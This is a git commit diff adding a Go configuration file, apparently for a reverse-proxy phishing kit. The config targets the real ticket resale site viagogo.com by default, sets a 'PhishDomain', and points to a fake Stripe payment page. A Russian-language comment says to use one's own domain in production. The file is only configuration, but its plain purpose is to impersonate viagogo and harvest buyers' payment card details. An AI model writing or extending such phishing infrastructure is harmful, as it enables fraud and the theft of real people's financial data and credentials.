cb57986c3f53408bff47c53e28fba141d6e5990c
gigglemyballz_bradarwatisdis <84795310+IsolRock45@users.noreply.github.com>
2026-06-10 15:15:51 +0300

    Update config.go

--- config/config.go
+++ config/config.go
@@ -1,1 +1,29 @@
 
+package config
+
+import "os"
+
+type Config struct {
+    Port         string
+    TargetScheme string
+    TargetHost   string
+    PhishDomain  string
+    StripePage   string
+}
+
+func Load() *Config {
+    return &Config{
+        Port:         getEnv("PORT", "8080"),
+        TargetScheme: getEnv("TARGET_SCHEME", "https"),
+        TargetHost:   getEnv("TARGET_HOST", "www.viagogo.com"),
+        PhishDomain:  getEnv("PHISH_DOMAIN", "localhost:8080"), // на проде свой домен
+        StripePage:   getEnv("STRIPE_PAGE", "/static/stripe.html"),
+    }
+}
+
+func getEnv(key, fallback string) string {
+    if v := os.Getenv(key); v != "" {
+        return v
+    }
+    return fallback
+}
